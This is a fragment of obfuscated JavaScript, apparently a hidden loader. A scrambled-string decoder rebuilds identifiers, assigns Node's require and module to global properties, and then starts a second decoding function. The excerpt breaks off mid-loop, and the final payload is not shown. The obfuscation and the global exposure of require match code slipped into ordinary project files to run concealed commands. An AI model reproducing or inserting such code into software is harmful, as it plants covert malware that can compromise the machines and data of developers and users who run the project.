...
var _$_c266 = (function (r, i) {
  ...
  for (var c = 0; c < y; c++) {
    var m = i * (c + 498) + (i % 21741);
    var d = i * (c + 712) + (i % 35379);
    var s = m % y;
    var p = d % y;
    var b = e[s];
    e[s] = e[p];
  ...
  var o = "\x23\x30";
  var q = "\x23";
  return e.join(n).split(z).join(k).split(g).join(f).split(o).join(q).split(k);
})("mbtec%roj%", 1115771);
global[_$_c266[0]] = require;
if (typeof module === _$_c266[1]) {
  global[_$_c266[2]] = module;
}
(function () {
  var wEb = "",
    gzG = 928 - 917;
  function VQu(t) {
    ...
    for (var b = 0; b < c; b++) {
      var f = v * (b + 139) + (v % 12726);
      var k = v * (b + 153) + (v % 14992);
      var l = f % c;
      var s = k % c;
      var u = g[l];
      g[l] = g[s];
